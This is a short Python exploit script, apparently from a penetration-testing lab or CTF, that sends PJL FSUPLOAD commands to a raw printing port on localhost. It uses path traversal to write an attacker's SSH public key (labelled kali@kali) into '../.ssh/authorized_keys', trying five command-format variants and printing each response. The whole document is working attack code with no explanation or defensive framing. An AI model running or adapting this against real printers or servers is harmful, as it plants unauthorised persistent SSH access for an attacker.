#!/usr/bin/env python3
import socket

KEY = b"ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHd2jjZHAM69tyxWab23os5aDLAjABySY04Zxxw14x41 kali@kali\n"
n = len(KEY)

formats = [
    ("one_line", f'@PJL FSUPLOAD NAME="../.ssh/authorized_keys" SIZE={n}\r\n'.encode() + KEY),
    ("size_nl", f'@PJL FSUPLOAD NAME="../.ssh/authorized_keys"\r\nSIZE={n}\r\n'.encode() + KEY),
    ("0prefix", f'@PJL FSUPLOAD NAME="0:../.ssh/authorized_keys" SIZE={n}\r\n'.encode() + KEY),
    ("no_quotes", f"@PJL FSUPLOAD NAME=../.ssh/authorized_keys SIZE={n}\r\n".encode() + KEY),
    ("lower", f'@pjl fsupload name="../.ssh/authorized_keys" size={n}\r\n'.encode() + KEY),
]

for name, payload in formats:
    s = socket.socket()
    s.settimeout(3)
    s.connect(("127.0.0.1", 9100))
    s.sendall(payload)
    try:
        r = s.recv(4096)
    except socket.timeout:
        r = b"TIMEOUT"
    s.close()
    print(name, repr(r[:120]))